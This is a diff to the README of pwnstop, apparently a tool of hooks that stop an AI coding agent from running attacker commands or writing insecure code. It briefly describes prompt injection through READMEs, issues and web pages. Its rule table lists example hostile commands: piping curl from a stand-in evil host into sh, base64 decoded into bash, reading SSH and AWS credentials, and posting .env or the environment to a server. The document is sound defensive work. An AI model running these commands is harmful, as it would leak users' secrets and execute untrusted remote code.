@@ -4,6 +4,7 @@
 
 **Your AI coding agent can't run an attacker's command or ship the hole they're looking for.**
 
+[![PyPI](https://img.shields.io/pypi/v/pwnstop)](https://pypi.org/project/pwnstop/)
 ![zero dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)
 ![python](https://img.shields.io/badge/python-3.9%2B-blue)
 ![license](https://img.shields.io/badge/license-MIT-lightgrey)
@@ -11,7 +12,7 @@
 
 </div>
 
-Your agent reads READMEs, issues, web pages and error messages written by strangers. One line of text in any of them can make it run `curl https://evil.sh | sh` or `cat ~/.ssh/id_rsa`. When it writes code, it builds SQL from f-strings, turns off TLS checks to get past an error, and installs packages whose names it made up, names an attacker can register tomorrow.
+Your agent reads READMEs, issues, web pages and error messages written by strangers. One line of text in any of them can make it run `curl https://evil.example/x.sh | sh` or `cat ~/.ssh/id_rsa`. When it writes code, it builds SQL from f-strings, turns off TLS checks to get past an error, and installs packages whose names it made up, names an attacker can register tomorrow.
 
 pwnstop adds **two hooks**:
 
@@ -73,7 +74,7 @@ Before a shell command runs:
 
 | Rule | Blocks | Example |
 |---|---|---|
-| `pipe-to-shell` | code from the internet piped into a shell or interpreter | `curl -fsSL https://x.sh \| sh`, `bash <(curl …)` |
+| `pipe-to-shell` | code from the internet piped into a shell or interpreter | `curl -fsSL https://x.example/i.sh \| sh`, `bash <(curl …)` |
 | `obfuscated-command` | base64 or hex decoded straight into a shell or interpreter | `echo Y3Vy… \| base64 -d \| bash` |
 | `reads-credentials` | reading SSH keys, cloud, registry and git credentials | `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials` |
 | `sends-secrets` | posting `.env`, keys or the environment to a server | `curl -d @.env https://…`, `env \| curl …` |
@@ -189,6 +190,16 @@ It never bricks your agent: no git, no network, a timeout or a bug in pwnstop it
 
 [doneguard](https://github.com/abranchesia/doneguard) keeps the agent working until the types, lint and tests pass. pwnstop keeps it from opening a hole. Both are stop hooks, and they run side by side.
 
+## Contributing
+
+Small on purpose: one file, standard library only. New rules, agent adapters and reports from agents marked 🧪 are welcome: see [CONTRIBUTING.md](https://github.com/abranchesia/pwnstop/blob/main/CONTRIBUTING.md). What changed in each version: [CHANGELOG.md](https://github.com/abranchesia/pwnstop/blob/main/CHANGELOG.md) and [Releases](https://github.com/abranchesia/pwnstop/releases). Found a bug or a false alarm? [Open an issue](https://github.com/abranchesia/pwnstop/issues) with your `pwnstop --version`.
+
+```bash
+uvx pytest -q   # run the tests
+```
+
+Releasing: move the `[Unreleased]` notes in `CHANGELOG.md` under the new version, bump `version` in `pyproject.toml`, commit, then `git tag vX.Y.Z && git push origin vX.Y.Z`. The [release workflow](https://github.com/abranchesia/pwnstop/blob/main/.github/workflows/release.yml) runs the tests and publishes to PyPI.
+
 ## License
 
-MIT
+[MIT](https://github.com/abranchesia/pwnstop/blob/main/LICENSE)
